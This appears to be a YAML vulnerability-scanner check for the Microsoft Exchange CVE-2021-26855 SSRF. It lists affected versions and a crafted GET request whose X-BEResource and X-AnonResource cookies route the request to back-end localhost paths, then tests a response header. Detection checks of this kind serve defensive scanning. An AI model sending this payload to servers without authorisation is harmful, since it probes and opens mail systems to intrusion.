detail:
  Affected Version: Exchange 2013 Versions < 15.00.1497.012, Exchange 2016 CU18 <
    15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009, Exchange 2019 CU7 < 15.02.0721.013,
    Exchange 2019 CU8 < 15.02.0792.010
  author: sharecast
  links:
  - https://github.com/microsoft/CSS-Exchange/blob/main/Security/http-vuln-cve2021-26855.nse
expression: r0()
manual: true
name: poc-yaml-exchange-cve-2021-26855-ssrf
rules:
  r0:
    expression: response.headers["X-CalculatedBETarget"].icontains("localhost")
    request:
      cache: true
      follow_redirects: false
      headers:
        Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3;
          X-BEResource=localhost/owa/auth/logon.aspx?~3;
      method: GET
      path: /owa/auth/x.js
transport: http
